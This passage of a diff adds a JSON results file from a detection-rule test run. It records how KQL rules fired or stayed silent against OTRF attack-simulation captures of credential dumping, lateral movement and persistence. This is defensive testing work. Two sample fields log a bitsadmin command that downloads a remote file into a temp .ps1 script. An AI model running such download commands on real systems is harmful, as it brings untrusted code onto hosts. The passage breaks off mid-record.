@@ -1,0 +1,3093 @@
+{
+ "run_utc": "2026-11-24 11:02 UTC",
+ "engine": "Kustainer (Azure Data Explorer emulator)",
+ "captures": {
+  "cmd_bitsadmin_download_psh_script": {
+   "source": "OTRF cmd_bitsadmin_download_psh_script",
+   "tables": {
+    "DeviceFileEvents": 6,
+    "DeviceProcessEvents": 2
+   }
+  },
+  "cmd_dumping_ntds_dit_file_ntdsutil": {
+   "source": "OTRF cmd_dumping_ntds_dit_file_ntdsutil",
+   "tables": {
+    "DeviceFileEvents": 88,
+    "DeviceProcessEvents": 8
+   }
+  },
+  "cmd_dumping_ntds_dit_file_volume_shadow_copy": {
+   "source": "OTRF cmd_dumping_ntds_dit_file_volume_shadow_copy",
+   "tables": {
+    "DeviceFileEvents": 118,
+    "DeviceProcessEvents": 15
+   }
+  },
+  "cmd_psexec_lsa_secrets_dump": {
+   "source": "OTRF cmd_psexec_lsa_secrets_dump",
+   "tables": {
+    "DeviceFileEvents": 7,
+    "DeviceNetworkEvents": 2,
+    "DeviceProcessEvents": 4
+   }
+  },
+  "covenant_sharpsc_create_dcerpc_smb_svcctl": {
+   "source": "OTRF covenant_sharpsc_create_dcerpc_smb_svcctl",
+   "tables": {
+    "DeviceRegistryEvents": 257
+   }
+  },
+  "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers": {
+   "source": "OTRF covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers",
+   "tables": {
+    "DeviceImageLoadEvents": 343,
+    "DeviceNetworkEvents": 46,
+    "DeviceProcessEvents": 5
+   }
+  },
+  "empire_launcher_sct_regsvr32": {
+   "source": "OTRF empire_launcher_sct_regsvr32",
+   "tables": {
+    "DeviceFileEvents": 15,
+    "DeviceProcessEvents": 7
+   }
+  },
+  "empire_launcher_vbs": {
+   "source": "OTRF empire_launcher_vbs",
+   "tables": {
+    "DeviceFileEvents": 22,
+    "DeviceProcessEvents": 5
+   }
+  },
+  "empire_ninjacopy_dumping_ntds_dit_file": {
+   "source": "OTRF empire_ninjacopy_dumping_ntds_dit_file",
+   "tables": {
+    "DeviceFileEvents": 96,
+    "DeviceProcessEvents": 16
+   }
+  },
+  "empire_psexec_dcerpc_tcp_svcctl": {
+   "source": "OTRF empire_psexec_dcerpc_tcp_svcctl",
+   "tables": {
+    "DeviceFileEvents": 23,
+    "DeviceNetworkEvents": 8,
+    "DeviceProcessEvents": 6,
+    "DeviceRegistryEvents": 203
+   }
+  },
+  "empire_schtasks_creation_execution_elevated_user": {
+   "source": "OTRF empire_schtasks_creation_execution_elevated_user",
+   "tables": {
+    "DeviceEvents": 187,
+    "DeviceFileEvents": 40,
+    "DeviceProcessEvents": 216,
+    "DeviceRegistryEvents": 26
+   }
+  },
+  "empire_schtasks_creation_standard_user": {
+   "source": "OTRF empire_schtasks_creation_standard_user",
+   "tables": {
+    "DeviceProcessEvents": 1
+   }
+  },
+  "empire_shell_reg_dump_sam": {
+   "source": "OTRF empire_shell_reg_dump_sam",
+   "tables": {
+    "DeviceFileEvents": 4,
+    "DeviceProcessEvents": 1
+   }
+  },
+  "empire_smbexec_dcerpc_smb_svcctl": {
+   "source": "OTRF empire_smbexec_dcerpc_smb_svcctl",
+   "tables": {
+    "DeviceFileEvents": 16,
+    "DeviceNetworkEvents": 6,
+    "DeviceProcessEvents": 10
+   }
+  },
+  "empire_uac_shellapi_fodhelper": {
+   "source": "OTRF empire_uac_shellapi_fodhelper",
+   "tables": {
+    "DeviceFileEvents": 34,
+    "DeviceProcessEvents": 18
+   }
+  },
+  "empire_wdigest_downgrade": {
+   "source": "OTRF empire_wdigest_downgrade",
+   "tables": {
+    "DeviceRegistryEvents": 97
+   }
+  },
+  "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod": {
+   "source": "OTRF empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod",
+   "tables": {
+    "DeviceNetworkEvents": 11,
+    "DeviceProcessEvents": 5
+   }
+  },
+  "psh_lsass_memory_dump_comsvcs": {
+   "source": "OTRF psh_lsass_memory_dump_comsvcs",
+   "tables": {
+    "DeviceEvents": 68,
+    "DeviceFileEvents": 2,
+    "DeviceProcessEvents": 1
+   }
+  },
+  "schtask_create": {
+   "source": "OTRF schtask_create",
+   "tables": {
+    "DeviceProcessEvents": 10
+   }
+  }
+ },
+ "detections": {
+  "ingress_tool_transfer_native": {
+   "rule": "Ingress_Tool_Transfer_Native_LOLBins_V2.kql",
+   "tactic": "command_and_control",
+   "own": [
+    "cmd_bitsadmin_download_psh_script"
+   ]
+  },
+  "lolbin_ingress_transfer": {
+   "rule": "LOLBINS_Ingress_Pack.kql",
+   "tactic": "command_and_control",
+   "own": [
+    "cmd_bitsadmin_download_psh_script"
+   ]
+  },
+  "lsass_credential_theft": {
+   "rule": "COMPOSITE_L3_LSASS_CREDENTIAL_THEFT_MASTER.kql",
+   "tactic": "credential_access",
+   "own": [
+    "psh_lsass_memory_dump_comsvcs"
+   ]
+  },
+  "ntds_credential_dumping": {
+   "rule": "NTDS_Domain_Credential_Dumping_V2.kql",
+   "tactic": "credential_access",
+   "own": [
+    "cmd_dumping_ntds_dit_file_ntdsutil",
+    "cmd_dumping_ntds_dit_file_volume_shadow_copy",
+    "empire_ninjacopy_dumping_ntds_dit_file",
+    "empire_shell_reg_dump_sam"
+   ]
+  },
+  "powershell_download_cradle": {
+   "rule": "PowerShell_Download_Ingress_Cradle_V2.kql",
+   "tactic": "command_and_control",
+   "own": [
+    "empire_launcher_sct_regsvr32",
+    "empire_launcher_vbs"
+   ]
+  },
+  "powershell_intent_first": {
+   "rule": "Powershell_Intent_First_Composite.kql",
+   "tactic": "execution",
+   "own": [
+    "empire_launcher_vbs",
+    "empire_uac_shellapi_fodhelper"
+   ]
+  },
+  "psexec_smb_service_execution": {
+   "rule": "PsExec_SMB_Service_Execution_REVISED.kql",
+   "tactic": "lateral_movement",
+   "own": [
+    "cmd_psexec_lsa_secrets_dump",
+    "empire_psexec_dcerpc_tcp_svcctl",
+    "empire_smbexec_dcerpc_smb_svcctl"
+   ]
+  },
+  "registry_lsa_security_providers": {
+   "rule": "Registry_Persistence_LSA_SecurityProviders.kql",
+   "tactic": "persistence",
+   "own": [
+    "empire_wdigest_downgrade"
+   ]
+  },
+  "registry_service_taskcache_persistence": {
+   "rule": "Registry_Persistence_Background_Service_TaskCache.kql",
+   "tactic": "persistence",
+   "own": [
+    "covenant_sharpsc_create_dcerpc_smb_svcctl",
+    "empire_psexec_dcerpc_tcp_svcctl",
+    "empire_schtasks_creation_execution_elevated_user"
+   ]
+  },
+  "scheduled_task_abuse": {
+   "rule": "Scheduled_Task_Abuse_Rundll_Aware_V2.kql",
+   "tactic": "execution",
+   "own": [
+    "empire_schtasks_creation_execution_elevated_user",
+    "empire_schtasks_creation_standard_user",
+    "schtask_create"
+   ]
+  },
+  "wmi_fileless_scrcons_consumer": {
+   "rule": "WMI_Fileless_Consumer_Execution_Scrcons_Substrate.kql",
+   "tactic": "persistence",
+   "own": [
+    "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers"
+   ]
+  },
+  "wmiprvse_remote_execution": {
+   "rule": "WmiPrvSE_Secondary_Execution_Victim.kql",
+   "tactic": "lateral_movement",
+   "own": [
+    "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod"
+   ]
+  }
+ },
+ "cells": [
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "cmd_bitsadmin_download_psh_script",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "what": "bitsadmin.exe  /transfer /download /priority foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1197/t1197.md c:\\users\\wardog\\appdata\\local\\temp\\bitsadmin1_flag.ps1",
+     "score": "135"
+    }
+   ]
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "cmd_dumping_ntds_dit_file_ntdsutil",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "cmd_dumping_ntds_dit_file_volume_shadow_copy",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "cmd_psexec_lsa_secrets_dump",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "covenant_sharpsc_create_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "empire_launcher_sct_regsvr32",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "empire_launcher_vbs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "empire_ninjacopy_dumping_ntds_dit_file",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "empire_psexec_dcerpc_tcp_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "empire_schtasks_creation_execution_elevated_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "empire_schtasks_creation_standard_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "empire_shell_reg_dump_sam",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "empire_smbexec_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "empire_uac_shellapi_fodhelper",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "empire_wdigest_downgrade",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "psh_lsass_memory_dump_comsvcs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ingress_tool_transfer_native",
+   "capture": "schtask_create",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "cmd_bitsadmin_download_psh_script",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "what": "bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\wardog\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+     "by": "cmd.exe",
+     "score": "100"
+    }
+   ]
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "cmd_dumping_ntds_dit_file_ntdsutil",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "cmd_dumping_ntds_dit_file_volume_shadow_copy",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "cmd_psexec_lsa_secrets_dump",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "covenant_sharpsc_create_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "empire_launcher_sct_regsvr32",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "empire_launcher_vbs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "empire_ninjacopy_dumping_ntds_dit_file",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "empire_psexec_dcerpc_tcp_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "empire_schtasks_creation_execution_elevated_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "empire_schtasks_creation_standard_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "empire_shell_reg_dump_sam",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "empire_smbexec_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "empire_uac_shellapi_fodhelper",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "empire_wdigest_downgrade",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "psh_lsass_memory_dump_comsvcs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lolbin_ingress_transfer",
+   "capture": "schtask_create",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "cmd_bitsadmin_download_psh_script",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "cmd_dumping_ntds_dit_file_ntdsutil",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "cmd_dumping_ntds_dit_file_volume_shadow_copy",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "cmd_psexec_lsa_secrets_dump",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "covenant_sharpsc_create_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "empire_launcher_sct_regsvr32",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "empire_launcher_vbs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "empire_ninjacopy_dumping_ntds_dit_file",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "empire_psexec_dcerpc_tcp_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "empire_schtasks_creation_execution_elevated_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "empire_schtasks_creation_standard_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "empire_shell_reg_dump_sam",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "empire_smbexec_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "empire_uac_shellapi_fodhelper",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "empire_wdigest_downgrade",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "psh_lsass_memory_dump_comsvcs",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "fires",
+   "rows": 2,
+   "sample": [
+    {
+     "score": "110"
+    },
+    {
+     "score": "65"
+    }
+   ]
+  },
+  {
+   "detection": "lsass_credential_theft",
+   "capture": "schtask_create",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "cmd_bitsadmin_download_psh_script",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "cmd_dumping_ntds_dit_file_ntdsutil",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "score": "170"
+    }
+   ]
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "cmd_dumping_ntds_dit_file_volume_shadow_copy",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "score": "150"
+    }
+   ]
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "cmd_psexec_lsa_secrets_dump",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "score": "60"
+    }
+   ]
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "covenant_sharpsc_create_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "empire_launcher_sct_regsvr32",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "empire_launcher_vbs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "empire_ninjacopy_dumping_ntds_dit_file",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "empire_psexec_dcerpc_tcp_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "empire_schtasks_creation_execution_elevated_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "empire_schtasks_creation_standard_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "empire_shell_reg_dump_sam",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "score": "60"
+    }
+   ]
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "empire_smbexec_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "empire_uac_shellapi_fodhelper",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "empire_wdigest_downgrade",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "psh_lsass_memory_dump_comsvcs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "ntds_credential_dumping",
+   "capture": "schtask_create",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "cmd_bitsadmin_download_psh_script",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "cmd_dumping_ntds_dit_file_ntdsutil",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "cmd_dumping_ntds_dit_file_volume_shadow_copy",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "cmd_psexec_lsa_secrets_dump",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
